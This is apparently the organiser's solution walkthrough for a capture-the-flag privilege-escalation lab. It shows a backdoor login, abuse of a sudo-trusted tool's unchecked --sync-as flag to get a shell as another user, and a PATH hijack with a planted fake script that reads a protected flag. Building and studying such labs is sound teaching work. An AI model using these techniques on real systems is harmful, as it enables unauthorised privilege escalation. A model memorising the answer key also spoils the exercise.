# SOLUTION — Erebus Access Control chain (delivery-side only, do NOT ship to players)

## Recon

```bash
ssh gh0st@localhost -p 2223            # backdoor — password: w0rmh0le
#   (or) ssh controlsvc@localhost -p 2223   — official, password: recovery-access
#   the animated station boot sequence prints the account banner automatically
#   on login (gh0st's stalls at 80% into the hijack message)
cd /opt/station/modules/access_control
cat README recovery_notes.txt
sudo -l                                # confirms the NOPASSWD zonectl sync * rule
```

`recovery_notes.txt` states the bug plainly: `sync` never checks that the
target is the caller's own account, and ships a `--shell` debug escape.

## Step 1 — horizontal: any entry account -> y.wu

```bash
sudo /opt/station/modules/access_control/bin/zonectl sync --sync-as y.wu --shell
whoami            # y.wu
```

`zonectl` runs as root (the sudoers rule), reads `--sync-as y.wu`,
`setuid()`s to `y.wu`'s uid with no allowlist check, then — because
`--shell` was passed — `execvp`s `/bin/bash` instead of writing the badge
cache. That's the whole bug: a target-selection flaw in the tool the sudo rule
trusts, not a flaw in sudo itself. `y.wu` (Researcher Wu Yan) is the account
the recovery memo flags as "touched by nobody."

## Step 2 — find the lead

```bash
cat /opt/station/modules/chronicler/duty_log.txt
```

States the second bug directly: `run-diagnostics.sh` puts
`/opt/station/modules/research_lab/toolbox` first on `PATH` and calls
`sensor-status` unqualified, running the whole thing as `labctl`.

```bash
sudo -l                                          # confirms y.wu can run
                                                  # run-diagnostics.sh AS labctl
cat /opt/station/modules/research_lab/bin/run-diagnostics.sh   # confirm the PATH line
ls -ld /opt/station/modules/research_lab/toolbox              # confirm it's y.wu-writable
```

## Step 3 — vertical: y.wu -> labctl, read the flag

```bash
cat > /opt/station/modules/research_lab/toolbox/sensor-status <<'EOF'
#!/bin/sh
cat /opt/station/modules/research_lab/logs/.mid_flag >> /opt/station/modules/research_lab/logs/logactivity.log
echo "sensor-status: full self-test PASS (all channels nominal)"
EOF
chmod +x /opt/station/modules/research_lab/toolbox/sensor-status

sudo -u labctl /opt/station/modules/research_lab/bin/run-diagnostics.sh
cat /opt/station/modules/research_lab/logs/logactivity.log
```

`run-diagnostics.sh` runs as `labctl` (via the sudoers rule), resolves
`sensor-status` against `PATH=/opt/station/modules/research_lab/toolbox:...`,
and executes y.wu's version instead of the real
`/opt/station/modules/research_lab/bin/sensor-status`. It runs with `labctl`'s
privileges, so it can read `/opt/station/modules/research_lab/logs/.mid_flag`
(mode `400`, owned `labctl:labctl`) which `y.wu` could not read directly. The
flag lands in `logactivity.log`, timestamped, alongside the script's own
"diagnostics run" entries — hence the diagram's "log entry + timestamp".

> Note (known content bug, deferred): the runtime `logs/` dir is created
> `0750 labctl:labctl`, so `y.wu` cannot traverse it to `cat` the log
> directly. Until that's changed (dir `0751`, or `-g y.wu`), read the flag by
> having the hijack payload also echo it to a world-readable path
> (`>&2` / `/tmp`), or `cat` the log from a `labctl`-context run. This is a
> permissions-tuning fix, not a change to the exploit path.

## Why both steps are required

- Without step 1, `y.wu`'s sudoers grant for `run-diagnostics.sh` is
  unreachable — only `y.wu` holds it.
- Without step 2/3, being `y.wu` alone doesn't expose the flag file —
  it's `labctl`-only, and `y.wu` cannot write directly to
  `/opt/station/modules/research_lab/bin` (root-owned) to plant a fake trusted
  tool there. The PATH hijack is the only escalation path from `y.wu` to
  `labctl`.

## Notes

- `tests/test_access_control_lab.py` drives both steps for real (actual Linux
  accounts, actual sudo, actual `setuid`/PATH resolution) without Docker.
- The daemon's *audit* trail
  (`/opt/station/modules/access_control/logs/zone_audit.log`) faithfully
  records the `sync --sync-as y.wu --shell` call, uid and all — it's not
  hidden, it's just not alerted on by anything. That's deliberate: this is a
  detection-gap lesson as much as an exploitation one.
